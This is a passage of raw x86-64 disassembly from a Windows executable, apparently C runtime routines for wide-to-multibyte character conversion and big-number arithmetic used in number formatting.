  409477:	48 8b 05 26 92 15 00 	mov    0x159226(%rip),%rax        # 0x5626a4
  40947e:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  409483:	48 85 c9             	test   %rcx,%rcx
  409486:	89 d6                	mov    %edx,%esi
  409488:	8b 38                	mov    (%rax),%edi
  40948a:	48 0f 45 d9          	cmovne %rcx,%rbx
  40948e:	ff 15 5c 39 15 00    	call   *0x15395c(%rip)        # 0x55cdf0
  409494:	0f b7 d6             	movzwl %si,%edx
  409497:	41 89 c0             	mov    %eax,%r8d
  40949a:	48 89 d9             	mov    %rbx,%rcx
  40949d:	41 89 f9             	mov    %edi,%r9d
  4094a0:	e8 4b ff ff ff       	call   0x4093f0
  4094a5:	48 98                	cltq
  4094a7:	48 83 c4 30          	add    $0x30,%rsp
  4094ab:	5b                   	pop    %rbx
  4094ac:	5e                   	pop    %rsi
  4094ad:	5f                   	pop    %rdi
  4094ae:	c3                   	ret
  4094af:	90                   	nop
  4094b0:	41 56                	push   %r14
  4094b2:	41 55                	push   %r13
  4094b4:	41 54                	push   %r12
  4094b6:	55                   	push   %rbp
  4094b7:	57                   	push   %rdi
  4094b8:	56                   	push   %rsi
  4094b9:	53                   	push   %rbx
  4094ba:	48 83 ec 30          	sub    $0x30,%rsp
  4094be:	31 f6                	xor    %esi,%esi
  4094c0:	49 89 d6             	mov    %rdx,%r14
  4094c3:	48 89 cb             	mov    %rcx,%rbx
  4094c6:	4c 89 c5             	mov    %r8,%rbp
  4094c9:	ff 15 21 39 15 00    	call   *0x153921(%rip)        # 0x55cdf0
  4094cf:	49 8b 3e             	mov    (%r14),%rdi
  4094d2:	41 89 c4             	mov    %eax,%r12d
  4094d5:	48 8b 05 c8 91 15 00 	mov    0x1591c8(%rip),%rax        # 0x5626a4
  4094dc:	48 85 ff             	test   %rdi,%rdi
  4094df:	44 8b 28             	mov    (%rax),%r13d
  4094e2:	74 42                	je     0x409526
  4094e4:	48 85 db             	test   %rbx,%rbx
  4094e7:	74 69                	je     0x409552
  4094e9:	48 85 ed             	test   %rbp,%rbp
  4094ec:	75 1c                	jne    0x40950a
  4094ee:	66 90                	xchg   %ax,%ax
  4094f0:	eb 4e                	jmp    0x409540
  4094f2:	48 63 c8             	movslq %eax,%rcx
  4094f5:	48 01 cb             	add    %rcx,%rbx
  4094f8:	48 01 ce             	add    %rcx,%rsi
  4094fb:	80 7b ff 00          	cmpb   $0x0,-0x1(%rbx)
  4094ff:	74 44                	je     0x409545
  409501:	48 83 c7 02          	add    $0x2,%rdi
  409505:	48 39 f5             	cmp    %rsi,%rbp
  409508:	76 36                	jbe    0x409540
  40950a:	0f b7 17             	movzwl (%rdi),%edx
  40950d:	45 89 e9             	mov    %r13d,%r9d
  409510:	45 89 e0             	mov    %r12d,%r8d
  409513:	48 89 d9             	mov    %rbx,%rcx
  409516:	e8 d5 fe ff ff       	call   0x4093f0
  40951b:	85 c0                	test   %eax,%eax
  40951d:	7f d3                	jg     0x4094f2
  40951f:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
  409526:	48 89 f0             	mov    %rsi,%rax
  409529:	48 83 c4 30          	add    $0x30,%rsp
  40952d:	5b                   	pop    %rbx
  40952e:	5e                   	pop    %rsi
  40952f:	5f                   	pop    %rdi
  409530:	5d                   	pop    %rbp
  409531:	41 5c                	pop    %r12
  409533:	41 5d                	pop    %r13
  409535:	41 5e                	pop    %r14
  409537:	c3                   	ret
  409538:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40953f:	00 
  409540:	49 89 3e             	mov    %rdi,(%r14)
  409543:	eb e1                	jmp    0x409526
  409545:	49 c7 06 00 00 00 00 	movq   $0x0,(%r14)
  40954c:	48 83 ee 01          	sub    $0x1,%rsi
  409550:	eb d4                	jmp    0x409526
  409552:	48 85 ed             	test   %rbp,%rbp
  409555:	75 24                	jne    0x40957b
  409557:	eb cd                	jmp    0x409526
  409559:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  409560:	48 63 d0             	movslq %eax,%rdx
  409563:	83 e8 01             	sub    $0x1,%eax
  409566:	48 98                	cltq
  409568:	48 01 d6             	add    %rdx,%rsi
  40956b:	80 7c 04 20 00       	cmpb   $0x0,0x20(%rsp,%rax,1)
  409570:	74 22                	je     0x409594
  409572:	48 83 c7 02          	add    $0x2,%rdi
  409576:	48 39 f5             	cmp    %rsi,%rbp
  409579:	76 ab                	jbe    0x409526
  40957b:	0f b7 17             	movzwl (%rdi),%edx
  40957e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  409583:	45 89 e9             	mov    %r13d,%r9d
  409586:	45 89 e0             	mov    %r12d,%r8d
  409589:	e8 62 fe ff ff       	call   0x4093f0
  40958e:	85 c0                	test   %eax,%eax
  409590:	7f ce                	jg     0x409560
  409592:	eb 8b                	jmp    0x40951f
  409594:	48 83 ee 01          	sub    $0x1,%rsi
  409598:	eb 8c                	jmp    0x409526
  40959a:	90                   	nop
  40959b:	90                   	nop
  40959c:	90                   	nop
  40959d:	90                   	nop
  40959e:	90                   	nop
  40959f:	90                   	nop
  4095a0:	56                   	push   %rsi
  4095a1:	53                   	push   %rbx
  4095a2:	48 83 ec 58          	sub    $0x58,%rsp
  4095a6:	48 85 d2             	test   %rdx,%rdx
  4095a9:	48 89 ce             	mov    %rcx,%rsi
  4095ac:	48 89 d3             	mov    %rdx,%rbx
  4095af:	0f 84 2e 01 00 00    	je     0x4096e3
  4095b5:	4d 85 c0             	test   %r8,%r8
  4095b8:	0f 84 32 01 00 00    	je     0x4096f0
  4095be:	0f b6 12             	movzbl (%rdx),%edx
  4095c1:	41 8b 01             	mov    (%r9),%eax
  4095c4:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
  4095cb:	89 44 24 40          	mov    %eax,0x40(%rsp)
  4095cf:	84 d2                	test   %dl,%dl
  4095d1:	0f 84 a9 00 00 00    	je     0x409680
  4095d7:	83 bc 24 98 00 00 00 	cmpl   $0x1,0x98(%rsp)
  4095de:	01 
  4095df:	76 7f                	jbe    0x409660
  4095e1:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
  4095e6:	0f 85 a4 00 00 00    	jne    0x409690
  4095ec:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
  4095f1:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
  4095f6:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
  4095fd:	ff 15 c1 8f 15 00    	call   *0x158fc1(%rip)        # 0x5625c4
  409603:	85 c0                	test   %eax,%eax
  409605:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  40960a:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
  40960f:	74 4f                	je     0x409660
  409611:	49 83 f8 01          	cmp    $0x1,%r8
  409615:	0f 86 f1 00 00 00    	jbe    0x40970c
  40961b:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
  409622:	00 
  409623:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
  409628:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  40962e:	49 89 d8             	mov    %rbx,%r8
  409631:	ba 08 00 00 00       	mov    $0x8,%edx
  409636:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
  40963d:	ff 15 a1 8f 15 00    	call   *0x158fa1(%rip)        # 0x5625e4
  409643:	85 c0                	test   %eax,%eax
  409645:	0f 84 ac 00 00 00    	je     0x4096f7
  40964b:	b8 02 00 00 00       	mov    $0x2,%eax
  409650:	48 83 c4 58          	add    $0x58,%rsp
  409654:	5b                   	pop    %rbx
  409655:	5e                   	pop    %rsi
  409656:	c3                   	ret
  409657:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40965e:	00 00 
  409660:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
  409667:	85 c0                	test   %eax,%eax
  409669:	75 45                	jne    0x4096b0
  40966b:	0f b6 03             	movzbl (%rbx),%eax
  40966e:	66 89 06             	mov    %ax,(%rsi)
  409671:	b8 01 00 00 00       	mov    $0x1,%eax
  409676:	48 83 c4 58          	add    $0x58,%rsp
  40967a:	5b                   	pop    %rbx
  40967b:	5e                   	pop    %rsi
  40967c:	c3                   	ret
  40967d:	0f 1f 00             	nopl   (%rax)
  409680:	66 c7 01 00 00       	movw   $0x0,(%rcx)
  409685:	31 c0                	xor    %eax,%eax
  409687:	48 83 c4 58          	add    $0x58,%rsp
  40968b:	5b                   	pop    %rbx
  40968c:	5e                   	pop    %rsi
  40968d:	c3                   	ret
  40968e:	66 90                	xchg   %ax,%ax
  409690:	88 54 24 41          	mov    %dl,0x41(%rsp)
  409694:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
  40969b:	00 
  40969c:	41 b9 02 00 00 00    	mov    $0x2,%r9d
  4096a2:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  4096a7:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
  4096ac:	eb 83                	jmp    0x409631
  4096ae:	66 90                	xchg   %ax,%ax
  4096b0:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
  4096b7:	00 
  4096b8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
  4096bd:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  4096c3:	49 89 d8             	mov    %rbx,%r8
  4096c6:	ba 08 00 00 00       	mov    $0x8,%edx
  4096cb:	8b 8c 24 90 00 00 00 	mov    0x90(%rsp),%ecx
  4096d2:	ff 15 0c 8f 15 00    	call   *0x158f0c(%rip)        # 0x5625e4
  4096d8:	85 c0                	test   %eax,%eax
  4096da:	74 1b                	je     0x4096f7
  4096dc:	b8 01 00 00 00       	mov    $0x1,%eax
  4096e1:	eb a4                	jmp    0x409687
  4096e3:	31 c0                	xor    %eax,%eax
  4096e5:	48 83 c4 58          	add    $0x58,%rsp
  4096e9:	5b                   	pop    %rbx
  4096ea:	5e                   	pop    %rsi
  4096eb:	c3                   	ret
  4096ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4096f0:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4096f5:	eb 90                	jmp    0x409687
  4096f7:	e8 c4 12 00 00       	call   0x40a9c0
  4096fc:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
  409702:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  409707:	e9 7b ff ff ff       	jmp    0x409687
  40970c:	0f b6 03             	movzbl (%rbx),%eax
  40970f:	41 88 01             	mov    %al,(%r9)
  409712:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  409717:	e9 6b ff ff ff       	jmp    0x409687
  40971c:	0f 1f 40 00          	nopl   0x0(%rax)
  409720:	55                   	push   %rbp
  409721:	57                   	push   %rdi
  409722:	56                   	push   %rsi
  409723:	53                   	push   %rbx
  409724:	48 83 ec 58          	sub    $0x58,%rsp
  409728:	48 8b 05 75 8f 15 00 	mov    0x158f75(%rip),%rax        # 0x5626a4
  40972f:	48 8d 5c 24 4e       	lea    0x4e(%rsp),%rbx
  409734:	48 85 c9             	test   %rcx,%rcx
  409737:	4c 89 ce             	mov    %r9,%rsi
  40973a:	48 89 d7             	mov    %rdx,%rdi
  40973d:	66 c7 44 24 4e 00 00 	movw   $0x0,0x4e(%rsp)
  409744:	8b 28                	mov    (%rax),%ebp
  409746:	48 0f 45 d9          	cmovne %rcx,%rbx
  40974a:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
  40974f:	ff 15 9b 36 15 00    	call   *0x15369b(%rip)        # 0x55cdf0
  409755:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
  40975a:	4c 8d 0d 4f 73 15 00 	lea    0x15734f(%rip),%r9        # 0x560ab0
  409761:	48 85 f6             	test   %rsi,%rsi
  409764:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
  409768:	89 44 24 20          	mov    %eax,0x20(%rsp)
  40976c:	48 89 fa             	mov    %rdi,%rdx
  40976f:	4c 0f 45 ce          	cmovne %rsi,%r9
  409773:	48 89 d9             	mov    %rbx,%rcx
  409776:	e8 25 fe ff ff       	call   0x4095a0
  40977b:	48 98                	cltq
  40977d:	48 83 c4 58          	add    $0x58,%rsp
  409781:	5b                   	pop    %rbx
  409782:	5e                   	pop    %rsi
  409783:	5f                   	pop    %rdi
  409784:	5d                   	pop    %rbp
  409785:	c3                   	ret
  409786:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40978d:	00 00 00 
  409790:	41 56                	push   %r14
  409792:	41 55                	push   %r13
  409794:	41 54                	push   %r12
  409796:	55                   	push   %rbp
  409797:	57                   	push   %rdi
  409798:	56                   	push   %rsi
  409799:	53                   	push   %rbx
  40979a:	48 83 ec 40          	sub    $0x40,%rsp
  40979e:	48 8d 2d 0f 73 15 00 	lea    0x15730f(%rip),%rbp        # 0x560ab4
  4097a5:	4d 85 c9             	test   %r9,%r9
  4097a8:	49 89 d6             	mov    %rdx,%r14
  4097ab:	48 89 ce             	mov    %rcx,%rsi
  4097ae:	49 0f 45 e9          	cmovne %r9,%rbp
  4097b2:	4c 89 c7             	mov    %r8,%rdi
  4097b5:	ff 15 35 36 15 00    	call   *0x153635(%rip)        # 0x55cdf0
  4097bb:	41 89 c5             	mov    %eax,%r13d
  4097be:	48 8b 05 df 8e 15 00 	mov    0x158edf(%rip),%rax        # 0x5626a4
  4097c5:	4d 85 f6             	test   %r14,%r14
  4097c8:	44 8b 20             	mov    (%rax),%r12d
  4097cb:	74 73                	je     0x409840
  4097cd:	49 8b 16             	mov    (%r14),%rdx
  4097d0:	48 85 d2             	test   %rdx,%rdx
  4097d3:	74 6b                	je     0x409840
  4097d5:	48 85 f6             	test   %rsi,%rsi
  4097d8:	74 6a                	je     0x409844
  4097da:	31 db                	xor    %ebx,%ebx
  4097dc:	48 85 ff             	test   %rdi,%rdi
  4097df:	75 1a                	jne    0x4097fb
  4097e1:	eb 49                	jmp    0x40982c
  4097e3:	49 8b 16             	mov    (%r14),%rdx
  4097e6:	48 63 c1             	movslq %ecx,%rax
  4097e9:	48 83 c6 02          	add    $0x2,%rsi
  4097ed:	48 01 c3             	add    %rax,%rbx
  4097f0:	48 01 c2             	add    %rax,%rdx
  4097f3:	48 39 df             	cmp    %rbx,%rdi
  4097f6:	49 89 16             	mov    %rdx,(%r14)
  4097f9:	76 21                	jbe    0x40981c
  4097fb:	49 89 f8             	mov    %rdi,%r8
  4097fe:	48 89 f1             	mov    %rsi,%rcx
  409801:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  409806:	49 29 d8             	sub    %rbx,%r8
  409809:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
  40980e:	49 89 e9             	mov    %rbp,%r9
  409811:	e8 8a fd ff ff       	call   0x4095a0
  409816:	85 c0                	test   %eax,%eax
  409818:	89 c1                	mov    %eax,%ecx
  40981a:	7f c7                	jg     0x4097e3
  40981c:	85 c9                	test   %ecx,%ecx
  40981e:	75 0c                	jne    0x40982c
  409820:	48 39 fb             	cmp    %rdi,%rbx
  409823:	73 07                	jae    0x40982c
  409825:	49 c7 06 00 00 00 00 	movq   $0x0,(%r14)
  40982c:	48 89 d8             	mov    %rbx,%rax
  40982f:	48 83 c4 40          	add    $0x40,%rsp
  409833:	5b                   	pop    %rbx
  409834:	5e                   	pop    %rsi
  409835:	5f                   	pop    %rdi
  409836:	5d                   	pop    %rbp
  409837:	41 5c                	pop    %r12
  409839:	41 5d                	pop    %r13
  40983b:	41 5e                	pop    %r14
  40983d:	c3                   	ret
  40983e:	66 90                	xchg   %ax,%ax
  409840:	31 db                	xor    %ebx,%ebx
  409842:	eb e8                	jmp    0x40982c
  409844:	48 85 ff             	test   %rdi,%rdi
  409847:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
  40984e:	74 f0                	je     0x409840
  409850:	44 89 e6             	mov    %r12d,%esi
  409853:	31 db                	xor    %ebx,%ebx
  409855:	eb 1c                	jmp    0x409873
  409857:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40985e:	00 00 
  409860:	49 8b 16             	mov    (%r14),%rdx
  409863:	48 98                	cltq
  409865:	48 01 c3             	add    %rax,%rbx
  409868:	48 01 c2             	add    %rax,%rdx
  40986b:	48 39 df             	cmp    %rbx,%rdi
  40986e:	49 89 16             	mov    %rdx,(%r14)
  409871:	76 b9                	jbe    0x40982c
  409873:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
  409878:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  40987d:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
  409882:	49 89 e9             	mov    %rbp,%r9
  409885:	49 89 f0             	mov    %rsi,%r8
  409888:	e8 13 fd ff ff       	call   0x4095a0
  40988d:	85 c0                	test   %eax,%eax
  40988f:	7f cf                	jg     0x409860
  409891:	eb 99                	jmp    0x40982c
  409893:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40989a:	84 00 00 00 00 00 
  4098a0:	55                   	push   %rbp
  4098a1:	57                   	push   %rdi
  4098a2:	56                   	push   %rsi
  4098a3:	53                   	push   %rbx
  4098a4:	48 83 ec 48          	sub    $0x48,%rsp
  4098a8:	48 8b 05 f5 8d 15 00 	mov    0x158df5(%rip),%rax        # 0x5626a4
  4098af:	48 89 ce             	mov    %rcx,%rsi
  4098b2:	48 89 d7             	mov    %rdx,%rdi
  4098b5:	4c 89 c3             	mov    %r8,%rbx
  4098b8:	66 c7 44 24 3e 00 00 	movw   $0x0,0x3e(%rsp)
  4098bf:	8b 28                	mov    (%rax),%ebp
  4098c1:	ff 15 29 35 15 00    	call   *0x153529(%rip)        # 0x55cdf0
  4098c7:	48 8d 15 ea 71 15 00 	lea    0x1571ea(%rip),%rdx        # 0x560ab8
  4098ce:	48 85 db             	test   %rbx,%rbx
  4098d1:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
  4098d6:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
  4098da:	89 44 24 20          	mov    %eax,0x20(%rsp)
  4098de:	49 89 f8             	mov    %rdi,%r8
  4098e1:	48 0f 44 da          	cmove  %rdx,%rbx
  4098e5:	48 89 f2             	mov    %rsi,%rdx
  4098e8:	49 89 d9             	mov    %rbx,%r9
  4098eb:	e8 b0 fc ff ff       	call   0x4095a0
  4098f0:	48 98                	cltq
  4098f2:	48 83 c4 48          	add    $0x48,%rsp
  4098f6:	5b                   	pop    %rbx
  4098f7:	5e                   	pop    %rsi
  4098f8:	5f                   	pop    %rdi
  4098f9:	5d                   	pop    %rbp
  4098fa:	c3                   	ret
  4098fb:	90                   	nop
  4098fc:	90                   	nop
  4098fd:	90                   	nop
  4098fe:	90                   	nop
  4098ff:	90                   	nop
  409900:	53                   	push   %rbx
  409901:	48 83 ec 20          	sub    $0x20,%rsp
  409905:	31 db                	xor    %ebx,%ebx
  409907:	83 f9 1b             	cmp    $0x1b,%ecx
  40990a:	7e 11                	jle    0x40991d
  40990c:	b8 04 00 00 00       	mov    $0x4,%eax
  409911:	01 c0                	add    %eax,%eax
  409913:	83 c3 01             	add    $0x1,%ebx
  409916:	8d 50 17             	lea    0x17(%rax),%edx
  409919:	39 ca                	cmp    %ecx,%edx
  40991b:	7c f4                	jl     0x409911
  40991d:	89 d9                	mov    %ebx,%ecx
  40991f:	e8 2c 04 00 00       	call   0x409d50
  409924:	89 18                	mov    %ebx,(%rax)
  409926:	48 83 c0 04          	add    $0x4,%rax
  40992a:	48 83 c4 20          	add    $0x20,%rsp
  40992e:	5b                   	pop    %rbx
  40992f:	c3                   	ret
  409930:	56                   	push   %rsi
  409931:	53                   	push   %rbx
  409932:	48 83 ec 28          	sub    $0x28,%rsp
  409936:	48 89 cb             	mov    %rcx,%rbx
  409939:	44 89 c1             	mov    %r8d,%ecx
  40993c:	48 89 d6             	mov    %rdx,%rsi
  40993f:	e8 bc ff ff ff       	call   0x409900
  409944:	44 0f b6 03          	movzbl (%rbx),%r8d
  409948:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
  40994c:	45 84 c0             	test   %r8b,%r8b
  40994f:	44 88 00             	mov    %r8b,(%rax)
  409952:	49 89 c0             	mov    %rax,%r8
  409955:	74 1d                	je     0x409974
  409957:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40995e:	00 00 
  409960:	44 0f b6 09          	movzbl (%rcx),%r9d
  409964:	49 83 c0 01          	add    $0x1,%r8
  409968:	48 83 c1 01          	add    $0x1,%rcx
  40996c:	45 84 c9             	test   %r9b,%r9b
  40996f:	45 88 08             	mov    %r9b,(%r8)
  409972:	75 ec                	jne    0x409960
  409974:	48 85 f6             	test   %rsi,%rsi
  409977:	74 03                	je     0x40997c
  409979:	4c 89 06             	mov    %r8,(%rsi)
  40997c:	48 83 c4 28          	add    $0x28,%rsp
  409980:	5b                   	pop    %rbx
  409981:	5e                   	pop    %rsi
  409982:	c3                   	ret
  409983:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40998a:	84 00 00 00 00 00 
  409990:	ba 01 00 00 00       	mov    $0x1,%edx
  409995:	48 89 c8             	mov    %rcx,%rax
  409998:	8b 49 fc             	mov    -0x4(%rcx),%ecx
  40999b:	d3 e2                	shl    %cl,%edx
  40999d:	89 48 04             	mov    %ecx,0x4(%rax)
  4099a0:	48 8d 48 fc          	lea    -0x4(%rax),%rcx
  4099a4:	89 50 08             	mov    %edx,0x8(%rax)
  4099a7:	e9 84 04 00 00       	jmp    0x409e30
  4099ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4099b0:	41 57                	push   %r15
  4099b2:	41 56                	push   %r14
  4099b4:	41 55                	push   %r13
  4099b6:	41 54                	push   %r12
  4099b8:	55                   	push   %rbp
  4099b9:	57                   	push   %rdi
  4099ba:	56                   	push   %rsi
  4099bb:	53                   	push   %rbx
  4099bc:	48 83 ec 38          	sub    $0x38,%rsp
  4099c0:	31 c0                	xor    %eax,%eax
  4099c2:	8b 72 14             	mov    0x14(%rdx),%esi
  4099c5:	49 89 cd             	mov    %rcx,%r13
  4099c8:	48 89 d1             	mov    %rdx,%rcx
  4099cb:	41 3b 75 14          	cmp    0x14(%r13),%esi
  4099cf:	0f 8f 4a 01 00 00    	jg     0x409b1f
  4099d5:	83 ee 01             	sub    $0x1,%esi
  4099d8:	48 8d 5a 18          	lea    0x18(%rdx),%rbx
  4099dc:	4d 8d 65 18          	lea    0x18(%r13),%r12
  4099e0:	4c 63 fe             	movslq %esi,%r15
  4099e3:	49 83 c7 04          	add    $0x4,%r15
  4099e7:	46 8b 44 ba 08       	mov    0x8(%rdx,%r15,4),%r8d
  4099ec:	43 8b 44 bd 08       	mov    0x8(%r13,%r15,4),%eax
  4099f1:	4a 8d 6c ba 08       	lea    0x8(%rdx,%r15,4),%rbp
  4099f6:	31 d2                	xor    %edx,%edx
  4099f8:	41 83 c0 01          	add    $0x1,%r8d
  4099fc:	41 f7 f0             	div    %r8d
  4099ff:	85 c0                	test   %eax,%eax
  409a01:	41 89 c6             	mov    %eax,%r14d
  409a04:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
  409a08:	0f 84 8a 00 00 00    	je     0x409a98
  409a0e:	89 c2                	mov    %eax,%edx
  409a10:	49 89 db             	mov    %rbx,%r11
  409a13:	4d 89 e2             	mov    %r12,%r10
  409a16:	31 c0                	xor    %eax,%eax
  409a18:	45 31 c9             	xor    %r9d,%r9d
  409a1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  409a20:	45 8b 03             	mov    (%r11),%r8d
  409a23:	49 83 c3 04          	add    $0x4,%r11
  409a27:	4c 0f af c2          	imul   %rdx,%r8
  409a2b:	4a 8d 3c 00          	lea    (%rax,%r8,1),%rdi
  409a2f:	45 8b 02             	mov    (%r10),%r8d
  409a32:	48 89 f8             	mov    %rdi,%rax
  409a35:	83 e7 ff             	and    $0xffffffff,%edi
  409a38:	48 c1 e8 20          	shr    $0x20,%rax
  409a3c:	49 29 f8             	sub    %rdi,%r8
  409a3f:	4d 29 c8             	sub    %r9,%r8
  409a42:	4d 89 c1             	mov    %r8,%r9
  409a45:	45 89 02             	mov    %r8d,(%r10)
  409a48:	49 83 c2 04          	add    $0x4,%r10
  409a4c:	49 c1 e9 20          	shr    $0x20,%r9
  409a50:	41 83 e1 01          	and    $0x1,%r9d
  409a54:	4c 39 dd             	cmp    %r11,%rbp
  409a57:	73 c7                	jae    0x409a20
  409a59:	47 8b 5c bd 08       	mov    0x8(%r13,%r15,4),%r11d
  409a5e:	45 85 db             	test   %r11d,%r11d
  409a61:	75 35                	jne    0x409a98
  409a63:	4b 8d 44 bd 00       	lea    0x0(%r13,%r15,4),%rax
  409a68:	48 8d 50 08          	lea    0x8(%rax),%rdx
  409a6c:	48 83 c0 04          	add    $0x4,%rax
  409a70:	49 39 c4             	cmp    %rax,%r12
  409a73:	73 1f                	jae    0x409a94
  409a75:	44 8b 52 fc          	mov    -0x4(%rdx),%r10d
  409a79:	45 85 d2             	test   %r10d,%r10d
  409a7c:	74 0a                	je     0x409a88
  409a7e:	eb 14                	jmp    0x409a94
  409a80:	44 8b 08             	mov    (%rax),%r9d
  409a83:	45 85 c9             	test   %r9d,%r9d
  409a86:	75 0c                	jne    0x409a94
  409a88:	48 83 e8 04          	sub    $0x4,%rax
  409a8c:	83 ee 01             	sub    $0x1,%esi
  409a8f:	49 39 c4             	cmp    %rax,%r12
  409a92:	72 ec                	jb     0x409a80
  409a94:	41 89 75 14          	mov    %esi,0x14(%r13)
  409a98:	48 89 ca             	mov    %rcx,%rdx
  409a9b:	4c 89 e9             	mov    %r13,%rcx
  409a9e:	e8 2d 08 00 00       	call   0x40a2d0
  409aa3:	85 c0                	test   %eax,%eax
  409aa5:	78 74                	js     0x409b1b
  409aa7:	41 83 c6 01          	add    $0x1,%r14d
  409aab:	4c 89 e1             	mov    %r12,%rcx
  409aae:	31 d2                	xor    %edx,%edx
  409ab0:	44 89 74 24 2c       	mov    %r14d,0x2c(%rsp)
  409ab5:	44 8b 03             	mov    (%rbx),%r8d
  409ab8:	8b 01                	mov    (%rcx),%eax
  409aba:	48 83 c3 04          	add    $0x4,%rbx
  409abe:	4c 29 c0             	sub    %r8,%rax
  409ac1:	48 29 d0             	sub    %rdx,%rax
  409ac4:	48 89 c2             	mov    %rax,%rdx
  409ac7:	89 01                	mov    %eax,(%rcx)
  409ac9:	48 83 c1 04          	add    $0x4,%rcx
  409acd:	48 c1 ea 20          	shr    $0x20,%rdx
  409ad1:	83 e2 01             	and    $0x1,%edx
  409ad4:	48 39 dd             	cmp    %rbx,%rbp
  409ad7:	73 dc                	jae    0x409ab5
  409ad9:	48 63 c6             	movslq %esi,%rax
  409adc:	48 83 c0 04          	add    $0x4,%rax
  409ae0:	45 8b 44 85 08       	mov    0x8(%r13,%rax,4),%r8d
  409ae5:	45 85 c0             	test   %r8d,%r8d
  409ae8:	75 31                	jne    0x409b1b
  409aea:	49 8d 44 85 00       	lea    0x0(%r13,%rax,4),%rax
  409aef:	48 8d 50 08          	lea    0x8(%rax),%rdx
  409af3:	48 83 c0 04          	add    $0x4,%rax
  409af7:	49 39 c4             	cmp    %rax,%r12
  409afa:	73 1b                	jae    0x409b17
  409afc:	8b 4a fc             	mov    -0x4(%rdx),%ecx
  409aff:	85 c9                	test   %ecx,%ecx
  409b01:	74 08                	je     0x409b0b
  409b03:	eb 12                	jmp    0x409b17
  409b05:	8b 10                	mov    (%rax),%edx
  409b07:	85 d2                	test   %edx,%edx
  409b09:	75 0c                	jne    0x409b17
  409b0b:	48 83 e8 04          	sub    $0x4,%rax
  409b0f:	83 ee 01             	sub    $0x1,%esi
  409b12:	49 39 c4             	cmp    %rax,%r12
  409b15:	72 ee                	jb     0x409b05
  409b17:	41 89 75 14          	mov    %esi,0x14(%r13)
  409b1b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
  409b1f:	48 83 c4 38          	add    $0x38,%rsp
  409b23:	5b                   	pop    %rbx
  409b24:	5e                   	pop    %rsi
  409b25:	5f                   	pop    %rdi
  409b26:	5d                   	pop    %rbp
  409b27:	41 5c                	pop    %r12
  409b29:	41 5d                	pop    %r13
  409b2b:	41 5e                	pop    %r14
  409b2d:	41 5f                	pop    %r15
  409b2f:	c3                   	ret
  409b30:	56                   	push   %rsi
  409b31:	53                   	push   %rbx
  409b32:	48 83 ec 28          	sub    $0x28,%rsp
  409b36:	8b 05 94 32 15 00    	mov    0x153294(%rip),%eax        # 0x55cdd0
  409b3c:	8b 1d 7e 6f 15 00    	mov    0x156f7e(%rip),%ebx        # 0x560ac0
  409b42:	89 ce                	mov    %ecx,%esi
  409b44:	85 c0                	test   %eax,%eax
  409b46:	75 18                	jne    0x409b60
  409b48:	89 d8                	mov    %ebx,%eax
  409b4a:	89 35 70 6f 15 00    	mov    %esi,0x156f70(%rip)        # 0x560ac0
  409b50:	48 83 c4 28          	add    $0x28,%rsp
  409b54:	5b                   	pop    %rbx
  409b55:	5e                   	pop    %rsi
  409b56:	c3                   	ret
  409b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  409b5e:	00 00 
  409b60:	e8 7b ba ff ff       	call   0x4055e0
  409b65:	48 8d 15 54 3f 15 00 	lea    0x153f54(%rip),%rdx        # 0x55dac0
  409b6c:	48 89 c1             	mov    %rax,%rcx
  409b6f:	ff 15 17 8a 15 00    	call   *0x158a17(%rip)        # 0x56258c
  409b75:	48 85 c0             	test   %rax,%rax
  409b78:	74 26                	je     0x409ba0
  409b7a:	89 f1                	mov    %esi,%ecx
